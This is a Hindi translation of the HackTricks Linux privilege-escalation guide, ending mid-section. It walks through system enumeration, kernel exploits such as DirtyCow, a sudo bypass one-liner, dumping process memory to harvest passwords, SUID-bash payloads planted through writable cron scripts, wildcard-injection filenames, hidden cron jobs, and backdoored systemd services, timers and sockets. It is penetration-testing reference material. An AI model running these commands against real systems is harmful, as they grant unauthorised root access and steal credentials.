# Linux विशेषाधिकार वृद्धि

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग तरकीबें साझा करें PRs जमा करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में.

</details>

## सिस्टम जानकारी

### OS जानकारी

चलिए OS की जानकारी प्राप्त करना शुरू करते हैं जो चल रहा है
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### पथ

यदि आपके पास `PATH` वेरिएबल के अंदर किसी भी फोल्डर पर **लिखने की अनुमति है**, तो आप कुछ लाइब्रेरीज या बाइनरीज को हाईजैक कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

पर्यावरण चर में दिलचस्प जानकारी, पासवर्ड या API कुंजियाँ?
```bash
(env || set) 2>/dev/null
```
### कर्नेल एक्सप्लॉइट्स

कर्नेल संस्करण की जांच करें और यदि कोई एक्सप्लॉइट हो जिसका उपयोग विशेषाधिकार बढ़ाने के लिए किया जा सकता है
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी वल्नरेबल कर्नेल सूची और कुछ पहले से **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
अन्य साइट्स जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी वल्नरेबल कर्नेल वर्जन्स को निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
कर्नेल एक्सप्लॉइट्स की खोज के लिए मददगार हो सकने वाले टूल्स हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (पीड़ित के अंदर निष्पादित करें, केवल कर्नेल 2.x के लिए एक्सप्लॉइट्स की जांच करता है)

हमेशा **Google में कर्नेल संस्करण की खोज करें**, हो सकता है आपका कर्नेल संस्करण किसी कर्नेल एक्सप्लॉइट में लिखा गया हो और तब आप सुनिश्चित हो सकते हैं कि यह एक्सप्लॉइट मान्य है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन संवेदनशील sudo संस्करणों के आधार पर जो दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo संस्करण संवेदनशील है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov से
```
sudo -u#-1 /bin/bash
```
### Dmesg हस्ताक्षर सत्यापन विफल

**smasher2 box of HTB** की जांच करें इस दोष का शोषण कैसे किया जा सकता है इसका एक **उदाहरण** के लिए
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक सिस्टम गणना
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित रक्षा प्रणालियों का अनुसंधान करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
ASLR का पूरा नाम Address Space Layout Randomization है।
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप एक docker container के अंदर हैं, तो आप इससे बाहर निकलने का प्रयास कर सकते हैं:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Drives

जांचें **क्या माउंट किया गया है और क्या नहीं**, कहाँ और क्यों। यदि कुछ भी अनमाउंटेड है तो आप इसे माउंट करने का प्रयास कर सकते हैं और निजी जानकारी के लिए जांच कर सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ्टवेयर

उपयोगी बाइनरीज़ की गणना करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
यह भी जांचें कि **कोई कंपाइलर इंस्टॉल है या नहीं**। यह उपयोगी है यदि आपको किसी कर्नेल एक्सप्लॉइट का उपयोग करना हो, क्योंकि इसे उसी मशीन में कंपाइल करने की सिफारिश की जाती है जहां आप इसे उपयोग करने वाले हैं (या एक समान में)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### स्थापित सॉफ्टवेयर में कमजोरी

**स्थापित पैकेजों और सेवाओं के संस्करण** की जांच करें। हो सकता है कि कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसका उपयोग विशेषाधिकार बढ़ाने के लिए किया जा सकता है...
अधिक संदिग्ध स्थापित सॉफ्टवेयर के संस्करण की मैन्युअल रूप से जांच करने की सिफारिश की जाती है।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH पहुँच है, तो आप **openVAS** का उपयोग करके मशीन के अंदर स्थापित पुराने और संवेदनशील सॉफ्टवेयर की जाँच कर सकते हैं।

{% hint style="info" %}
_ध्यान दें कि ये आदेश बहुत सारी जानकारी दिखाएंगे जो ज्यादातर बेकार होगी, इसलिए यह सिफारिश की जाती है कि OpenVAS या इसी तरह के कुछ एप्लिकेशन का उपयोग करें जो यह जाँच करेंगे कि कोई स्थापित सॉफ्टवेयर संस्करण ज्ञात दोषों के लिए संवेदनशील तो नहीं है_
{% endhint %}

## प्रक्रियाएँ

**कौन सी प्रक्रियाएँ** चल रही हैं इस पर नजर डालें और जाँच करें कि क्या कोई प्रक्रिया **अधिक विशेषाधिकार** प्राप्त कर रही है जितनी उसे मिलनी चाहिए (शायद एक tomcat को root द्वारा निष्पादित किया जा रहा है?)
```bash
ps aux
ps -ef
top -n 1
```
संभावित [**इलेक्ट्रॉन/सीईएफ/क्रोमियम डिबगर्स** की जांच करें जो चल रहे हों, आप इसका उपयोग करके विशेषाधिकार बढ़ा सकते हैं](electron-cef-chromium-debugger-abuse.md)। **लिनपीस** इसे प्रक्रिया की कमांड लाइन में `--inspect` पैरामीटर की जांच करके पता लगाता है।\
यह भी **जांचें कि आपके पास प्रक्रिया बाइनरीज़ पर क्या विशेषाधिकार हैं**, शायद आप किसी को ओवरराइट कर सकते हैं।

### प्रक्रिया निगरानी

आप [**पीएसपी**](https://github.com/DominicBreuker/pspy) जैसे उपकरणों का उपयोग करके प्रक्रियाओं की निगरानी कर सकते हैं। यह अक्सर चलने वाली या कुछ शर्तों के पूरा होने पर चलने वाली संवेदनशील प्रक्रियाओं की पहचान करने के लिए बहुत उपयोगी हो सकता है।

### प्रक्रिया स्मृति

कुछ सर्वर सेवाएं **स्मृति के अंदर स्पष्ट पाठ में क्रेडेंशियल्स सहेजती हैं**।\
सामान्यतः आपको अन्य उपयोगकर्ताओं की प्रक्रियाओं की स्मृति पढ़ने के लिए **रूट विशेषाधिकार** की आवश्यकता होगी, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से ही रूट हों और अधिक क्रेडेंशियल्स की खोज करना चाहते हों।\
हालांकि, याद रखें कि **एक सामान्य उपयोगकर्ता के रूप में आप अपनी प्रक्रियाओं की स्मृति पढ़ सकते हैं**।

{% hint style="warning" %}
ध्यान दें कि आजकल अधिकांश मशीनें **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं देती हैं** जिसका अर्थ है कि आप अपने अविशेषाधिकारी उपयोगकर्ता की अन्य प्रक्रियाओं को डंप नहीं कर सकते हैं।

फ़ाइल _**/proc/sys/kernel/yama/ptrace\_scope**_ ptrace की पहुंच को नियंत्रित करती है:

* **kernel.yama.ptrace\_scope = 0**: सभी प्रक्रियाएं डिबग की जा सकती हैं, जब तक कि उनकी यूआईडी समान हो। यह ptracing का क्लासिकल तरीका है।
* **kernel.yama.ptrace\_scope = 1**: केवल एक पैरेंट प्रक्रिया को डिबग किया जा सकता है।
* **kernel.yama.ptrace\_scope = 2**: केवल एडमिन ptrace का उपयोग कर सकते हैं, क्योंकि इसके लिए CAP\_SYS\_PTRACE क्षमता की आवश्यकता होती है।
* **kernel.yama.ptrace\_scope = 3**: कोई भी प्रक्रियाएं ptrace के साथ ट्रेस नहीं की जा सकती हैं। एक बार सेट होने के बाद, ptracing को फिर से सक्षम करने के लिए एक रिबूट की आवश्यकता होती है।
{% endhint %}

#### GDB

यदि आपके पास एक FTP सेवा (उदाहरण के लिए) की स्मृति तक पहुंच है, तो आप हीप प्राप्त कर सकते हैं और उसके क्रेडेंशियल्स के अंदर खोज कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

दिए गए प्रोसेस ID के लिए, **maps यह दिखाता है कि कैसे मेमोरी उस प्रोसेस के** वर्चुअल एड्रेस स्पेस में मैप की गई है; यह **प्रत्येक मैप किए गए क्षेत्र की अनुमतियों को भी दिखाता है**। **mem** पस्यूडो फाइल **प्रोसेस की मेमोरी को स्वयं प्रकट करती है**। **maps** फाइल से हम जानते हैं कि कौन से **मेमोरी क्षेत्र पढ़ने योग्य हैं** और उनके ऑफसेट्स क्या हैं। हम इस जानकारी का उपयोग करके **mem फाइल में जाकर सभी पढ़ने योग्य क्षेत्रों को एक फाइल में डंप करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, वर्चुअल मेमोरी तक नहीं। कर्नेल का वर्चुअल एड्रेस स्पेस /dev/kmem का उपयोग करके पहुँचा जा सकता है।\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ा जा सकता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### लिनक्स के लिए ProcDump

ProcDump विंडोज के Sysinternals सूट के क्लासिक ProcDump टूल का लिनक्स संस्करण है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) से प्राप्त करें।
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

प्रोसेस मेमोरी डंप करने के लिए आप इस्तेमाल कर सकते हैं:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (रूट) - \_आप मैन्युअली रूट आवश्यकताओं को हटा सकते हैं और अपने द्वारा स्वामित्व वाली प्रोसेस को डंप कर सकते हैं
* स्क्रिप्ट A.5 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) से (रूट आवश्यक है)

### प्रोसेस मेमोरी से क्रेडेंशियल्स

#### मैन्युअल उदाहरण

यदि आप पाते हैं कि प्रमाणीकरण प्रोसेस चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
प्रक्रिया को डंप कर सकते हैं (प्रक्रिया की मेमोरी को डंप करने के विभिन्न तरीकों को जानने के लिए पहले के अनुभाग देखें) और मेमोरी के अंदर क्रेडेंशियल्स की खोज कर सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

उपकरण [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **मेमोरी से स्पष्ट पाठ साख चुराएगा** और कुछ **प्रसिद्ध फाइलों** से भी। इसे सही ढंग से काम करने के लिए रूट विशेषाधिकार की आवश्यकता होती है।

| सुविधा                                             | प्रक्रिया का नाम       |
| ------------------------------------------------- | -------------------- |
| GDM पासवर्ड (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                      | vsftpd               |
| Apache2 (सक्रिय HTTP Basic Auth सत्र)            | apache2              |
| OpenSSH (सक्रिय SSH सत्र - Sudo उपयोग)          | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## निर्धारित/क्रॉन जॉब्स

जांचें कि क्या कोई निर्धारित जॉब संवेदनशील है। शायद आप एक स्क्रिप्ट का लाभ उठा सकते हैं जो रूट द्वारा निष्पादित की जा रही है (वाइल्डकार्ड वल्न? फाइलों को संशोधित कर सकते हैं जिनका रूट उपयोग करता है? सिम्लिंक्स का उपयोग करें? निर्देशिका में विशिष्ट फाइलें बनाएं जिनका रूट उपयोग करता है?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### क्रॉन पथ

उदाहरण के लिए, _/etc/crontab_ में आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_नोट करें कि "user" नामक उपयोगकर्ता को /home/user पर लिखने की अनुमति है_)

यदि इस crontab में रूट उपयोगकर्ता किसी कमांड या स्क्रिप्ट को पथ सेट किए बिना निष्पादित करने का प्रयास करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तब, आप निम्नलिखित का उपयोग करके रूट शेल प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron एक स्क्रिप्ट का उपयोग करता है जिसमें वाइल्डकार्ड होता है (Wildcard Injection)

यदि कोई स्क्रिप्ट जिसे root द्वारा निष्पादित किया जाता है, उसमें कमांड के अंदर “**\***” होता है, तो आप इसका लाभ उठाकर अप्रत्याशित चीजें कर सकते हैं (जैसे कि privesc)। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि वाइल्डकार्ड के पहले कोई पथ हो जैसे कि** _**/कुछ/पथ/\***_**, तो यह असुरक्षित नहीं है (यहां तक कि** _**./\***_ **भी नहीं).**

निम्नलिखित पृष्ठ पर और वाइल्डकार्ड शोषण तरकीबों के लिए पढ़ें:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### क्रॉन स्क्रिप्ट ओवरराइटिंग और सिमलिंक

यदि आप **क्रॉन स्क्रिप्ट को संशोधित कर सकते हैं** जिसे रूट द्वारा निष्पादित किया जाता है, तो आप बहुत आसानी से शेल प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा निष्पादित स्क्रिप्ट एक **डायरेक्टरी का उपयोग करती है जहाँ आपकी पूरी पहुँच है**, तो शायद उस फोल्डर को हटाना और **एक सिम्लिंक फोल्डर बनाना उपयोगी हो सकता है जो दूसरे को नियंत्रित करता है** जिसमें आपके द्वारा नियंत्रित स्क्रिप्ट हो।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### अक्सर चलने वाले cron jobs

आप प्रक्रियाओं की निगरानी कर सकते हैं ताकि उन प्रक्रियाओं की खोज की जा सके जो हर 1, 2 या 5 मिनट में चलाई जा रही हैं। शायद आप इसका फायदा उठाकर विशेषाधिकार बढ़ा सकते हैं।

उदाहरण के लिए, **हर 0.1s पर 1 मिनट तक निगरानी करने के लिए**, **कम चलाए गए कमांड्स के अनुसार क्रमबद्ध करें** और उन कमांड्स को हटा दें जो सबसे ज्यादा चलाए गए हैं, आप यह कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर प्रक्रिया को मॉनिटर और सूचीबद्ध करेगा जो शुरू होती है) **का उपयोग भी कर सकते हैं**।

### अदृश्य cron jobs

एक क्रॉनजॉब **टिप्पणी के बाद एक कैरिज रिटर्न डालकर** बनाना संभव है (न्यूलाइन कैरेक्टर के बिना), और क्रॉन जॉब काम करेगा। उदाहरण (कैरिज रिटर्न चार का ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फाइलें

जांचें कि क्या आप किसी `.service` फाइल को लिख सकते हैं, यदि आप कर सकते हैं, तो आप **इसे संशोधित कर सकते हैं** ताकि यह आपके **बैकडोर को निष्पादित करे जब** सेवा **शुरू**, **पुनः शुरू** या **रोकी गई** हो (शायद आपको मशीन के पुनः आरंभ होने तक प्रतीक्षा करनी पड़ सकती है).\
उदाहरण के लिए अपने बैकडोर को .service फाइल के अंदर **`ExecStart=/tmp/script.sh`** के साथ बनाएं

### लिखने योग्य सेवा बाइनरीज

ध्यान रखें कि यदि आपके पास **सेवाओं द्वारा निष्पादित बाइनरीज पर लिखने की अनुमतियां हैं**, तो आप उन्हें बैकडोर्स के लिए बदल सकते हैं ताकि जब सेवाएँ पुनः निष्पादित हों तो बैकडोर्स निष्पादित होंगे।

### systemd PATH - सापेक्ष पथ

आप **systemd** द्वारा प्रयुक्त PATH को इसके साथ देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप पथ के किसी भी फोल्डर में **लिख** सकते हैं, तो आप **विशेषाधिकार बढ़ा** सकते हैं। आपको **सेवा विन्यास** फाइलों में प्रयुक्त **सापेक्ष पथों** की खोज करनी होगी जैसे कि:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, systemd PATH फ़ोल्डर में **समान नाम के साथ एक एक्जीक्यूटेबल** बनाएं जिसे आप लिख सकते हैं, और जब सेवा से वल्नरेबल एक्शन (**Start**, **Stop**, **Reload**) को निष्पादित करने के लिए कहा जाता है, आपका **बैकडोर निष्पादित हो जाएगा** (आमतौर पर अनाधिकृत उपयोगकर्ता सेवाओं को शुरू/रोक नहीं सकते लेकिन जांचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**सेवाओं के बारे में अधिक जानें `man systemd.service` के साथ।**

## **टाइमर्स**

**टाइमर्स** systemd यूनिट फाइलें हैं जिनका नाम `**.timer**` में समाप्त होता है जो `**.service**` फाइलों या इवेंट्स को नियंत्रित करते हैं। **टाइमर्स** का उपयोग cron के विकल्प के रूप में किया जा सकता है क्योंकि उनमें कैलेंडर समय इवेंट्स और मोनोटोनिक समय इवेंट्स के लिए निर्मित समर्थन होता है और इन्हें असिंक्रोनस रूप से चलाया जा सकता है।

आप सभी टाइमर्स को इसके साथ गिन सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर्स

यदि आप एक टाइमर को संशोधित कर सकते हैं, तो आप इसे कुछ मौजूदा systemd.unit (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
डॉक्यूमेंटेशन में आप पढ़ सकते हैं कि यूनिट क्या है:

> जब यह टाइमर समाप्त होता है तो सक्रिय करने के लिए यूनिट। तर्क एक यूनिट नाम है, जिसका सफ़िक्स ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मूल्य एक सेवा के लिए डिफ़ॉल्ट होता है जिसका नाम टाइमर यूनिट के समान होता है, सफ़िक्स को छोड़कर। (ऊपर देखें।) यह सिफारिश की जाती है कि सक्रिय किया गया यूनिट नाम और टाइमर यूनिट का यूनिट नाम समान रूप से नामित होते हैं, सफ़िक्स को छोड़कर।

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको आवश्यकता होगी:

* कुछ systemd यूनिट (जैसे `.service`) खोजें जो **लिखने योग्य बाइनरी को निष्पादित कर रहा हो**
* कुछ systemd यूनिट खोजें जो **सापेक्ष पथ को निष्पादित कर रहा हो** और आपके पास **systemd PATH** पर **लिखने के अधिकार** हों (उस निष्पादन योग्य की नकल करने के लिए)

**`man systemd.timer` के साथ टाइमर्स के बारे में और जानें।**

### **टाइमर सक्षम करना**

टाइमर को सक्षम करने के लिए आपको रूट विशेषाधिकारों की आवश्यकता होती है और निष्पादित करने के लिए:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **टाइमर** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर एक symlink बनाकर **सक्रिय** किया जाता है।

## Sockets

संक्षेप में, एक Unix Socket (तकनीकी रूप से, सही नाम Unix Domain Socket, **UDS**) एक ही मशीन या अलग-अलग मशीनों पर क्लाइंट-सर्वर एप्लिकेशन फ्रेमवर्क में **दो अलग-अलग प्रक्रियाओं के बीच संचार** की अनुमति देता है। अधिक सटीक होने के लिए, यह कंप्यूटरों के बीच संचार करने का एक तरीका है जो एक मानक Unix डिस्क्रिप्टर्स फाइल का उपयोग करता है। ([यहाँ](https://www.linux.com/news/what-socket/) से).

Sockets को `.socket` फाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**`man systemd.socket` के साथ sockets के बारे में और जानें।** इस फाइल के अंदर, कई दिलचस्प पैरामीटर्स कॉन्फ़िगर किए जा सकते हैं:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग हैं लेकिन एक सारांश इस्तेमाल किया जाता है **यह दर्शाने के लिए कि यह कहाँ सुनेगा** socket को (AF_UNIX socket फाइल का पथ, IPv4/6 और/या सुनने के लिए पोर्ट नंबर, आदि।)
* `Accept`: एक बूलियन आर्गुमेंट लेता है। अगर **सच**, तो प्रत्येक आने वाले कनेक्शन के लिए एक **सेवा इंस्टेंस शुरू किया जाता है** और केवल कनेक्शन सॉकेट ही इसे पास किया जाता है। अगर **गलत**, तो सभी सुनने वाले सॉकेट्स खुद ही **शुरू की गई सेवा यूनिट को पास किए जाते हैं**, और सभी कनेक्शनों के लिए केवल एक सेवा यूनिट शुरू की जाती है। यह मूल्य डेटाग्राम सॉकेट्स और FIFOs के लिए अनदेखा किया जाता है जहाँ एक ही सेवा यूनिट बिना शर्त सभी आने वाले ट्रैफिक को संभालती है। **डिफ़ॉल्ट रूप से गलत होता है**। प्रदर्शन कारणों से, यह सिफारिश की जाती है कि नए डेमन्स को केवल `Accept=no` के लिए उपयुक्त तरीके से लिखा जाए।
* `ExecStartPre`, `ExecStartPost`: एक या अधिक कमांड लाइन्स लेता है, जो **सुनने वाले सॉकेट्स**/FIFOs के **बनाए जाने** और बांधे जाने से **पहले** या **बाद** में क्रमशः **निष्पादित किए जाते हैं**। कमांड लाइन का पहला टोकन एक पूर्ण फ़ाइलनाम होना चाहिए, उसके बाद प्रक्रिया के लिए आर्गुमेंट्स होते हैं।
* `ExecStopPre`, `ExecStopPost`: अतिरिक्त **कमांड्स** जो **सुनने वाले सॉकेट्स**/FIFOs के **बंद होने** और हटाए जाने से **पहले** या **बाद** में क्रमशः **निष्पादित किए जाते हैं**।
* `Service`: **आने वाले ट्रैफिक** पर **सक्रिय करने के लिए** **सेवा** यूनिट का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no के साथ सॉकेट्स के लिए अनुमति है। यह डिफ़ॉल्ट रूप से उस सेवा के लिए होता है जो सॉकेट के समान नाम वाली होती है (प्रत्यय को बदल दिया गया है)। अधिकांश मामलों में, इस विकल्प का उपयोग करने की आवश्यकता नहीं होनी चाहिए।

### लिखने योग्य .socket फाइलें

अगर आपको कोई **लिखने योग्य** `.socket` फाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा **जोड़** सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और बैकडोर सॉकेट बनाए जाने से पहले निष्पादित होगा। इसलिए, आपको **शायद मशीन के रिबूट होने तक इंतजार करना पड़ेगा।**\
_ध्यान दें कि सिस्टम को उस सॉकेट फाइल कॉन्फ़िगरेशन का उपयोग करना चाहिए या बैकडोर निष्पादित नहीं होगा_

### लिखने योग्य सॉकेट्स

